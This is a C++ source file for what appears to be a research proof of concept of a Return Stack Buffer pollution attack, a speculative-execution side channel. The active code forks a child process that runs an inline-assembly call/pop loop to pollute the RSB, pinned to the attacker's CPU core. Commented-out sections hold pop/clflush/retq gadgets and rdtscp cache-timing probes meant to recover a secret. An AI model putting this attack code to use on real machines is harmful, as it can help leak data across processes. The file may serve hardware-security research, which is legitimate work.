#include "util.hpp"
#include <iostream>
#include <fstream>

using namespace std;

char array[256*256];

// char array[256*256];

// volatile int foo(){
// 	return 0;
// }

// volatile int goo(){
// 	__asm__(
// 		".rept 564;"
// 		"nop;"
// 		".endr;"
// 	);
// }

// volatile void gadget(){
// 	__asm__(
// 	"pop %rdi;"
// 	"pop %rdi;"	
// 	"pop %rdi;"
// 	"pop %rdi;"
// 	"nop;"
// 	"pop %rbp;"
// 	"clflush (%rsp);"
// 	"clflush (%rip);"
// 	"cpuid;"
// 	"retq;");
// }

// int speculative(){
// 	gadget();
// 	int paceholder = 0;
// 	return 0;
// }

volatile void spacer() {
	asm(
		// ".rept 2235;"
		".rept 2215;"
		"nop;"
		".endr;"
	);
}

void gadget() {
	asm(
		"lbl:"
		"pop %rax;"
		"call lbl;"
	);
}

int main(int argc, char *argv[]){
	printf("Attacker Launching...\n");

	// start child process
	pid_t pid = fork();
	// loads the entire array

	if(pid == 0){
		// child process
		auto cpu = sched_getcpu();
		printf("RSB pollution on core: %d\n", cpu);
		// doing nothing, just for comparison
		if ((argc == 2)&&(argv[1][0]=='0')) {
			printf("doing nothing\n");
			while(1) {}
			return 0;
		}
		// polluter start polluting RSB
		else if((argc == 2)&&(argv[1][0]=='1')){
			printf("Polluting RSB...\n");
			gadget();
			return 0;
		}
		else{
			printf("Invalid argument\n");
			return -1;
		}

	}
	else if(pid > 0){
		auto cpu = sched_getcpu();
		printf("Attacker launched on core: %d\n", cpu);
		cpu_set_t  mask;
		CPU_ZERO(&mask);
		CPU_SET(cpu, &mask);
		auto result = sched_setaffinity(pid, sizeof(mask), &mask);
		// parent process;
		sleep(1);
		//access time to the array;
		kill(pid, SIGKILL);
		printf("RSB pollution ended\n");
		// printf("secret found\n");
		return 0;
	}
	else{
		printf("fork error\n");
		return -1;
	}

	// string buffer;
	// char temp;
	// volatile int i = 0;

	// temp &= array[0];
	// temp &= array[80];
	// temp &= array[200];

	// speculative();

	// unsigned int dummy;
	// auto t1 = __rdtscp(&dummy);
	// temp &= array[0];
	// auto t2 = __rdtscp(&dummy);
	// cout<<t2-t1<<endl;

	// auto t3 = __rdtscp(&dummy);
	// temp &= array[80];
	// auto t4 = __rdtscp(&dummy);
	// cout<<t4-t3<<endl;

	// auto t5 = __rdtscp(&dummy);
	// temp &= array[200];
	// auto t6 = __rdtscp(&dummy);
	// cout<<t6-t5<<endl;

	// return 0;
}